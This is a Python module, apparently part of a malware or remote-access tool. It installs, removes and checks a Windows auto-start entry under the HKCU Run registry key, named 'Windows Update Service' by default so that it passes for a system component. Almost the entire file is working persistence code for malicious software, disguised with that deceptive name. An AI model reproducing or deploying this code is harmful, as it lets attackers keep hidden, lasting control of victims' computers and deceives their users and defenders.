import sys
import os

try:
    import winreg
    WINDOWS_SUPPORT = True
except ImportError:
    WINDOWS_SUPPORT = False

def install_registry_persistence(exe_path=None, name="Windows Update Service"):
    """Add program to Windows auto-start registry"""
    if not WINDOWS_SUPPORT:
        print("Registry persistence only available on Windows")
        return False
    
    if exe_path is None:
        exe_path = sys.executable
    
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            reg_path,
            0,
            winreg.KEY_SET_VALUE
        )
        
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        
        print(f"[+] Registry persistence installed: {name}")
        return True
    except Exception as e:
        print(f"[-] Failed to install registry persistence: {e}")
        return False

def remove_registry_persistence(name="Windows Update Service"):
    """Remove from auto-start registry"""
    if not WINDOWS_SUPPORT:
        return False
    
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            reg_path,
            0,
            winreg.KEY_SET_VALUE
        )
        
        winreg.DeleteValue(key, name)
        winreg.CloseKey(key)
        
        print(f"[+] Registry persistence removed: {name}")
        return True
    except Exception as e:
        print(f"[-] Failed to remove registry persistence: {e}")
        return False

def check_registry_persistence(name="Windows Update Service"):
    """Check if persistence entry exists"""
    if not WINDOWS_SUPPORT:
        return False
    
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            reg_path,
            0,
            winreg.KEY_READ
        )
        
        value, _ = winreg.QueryValueEx(key, name)
        winreg.CloseKey(key)
        
        return True
    except FileNotFoundError:
        return False
    except Exception:
        return False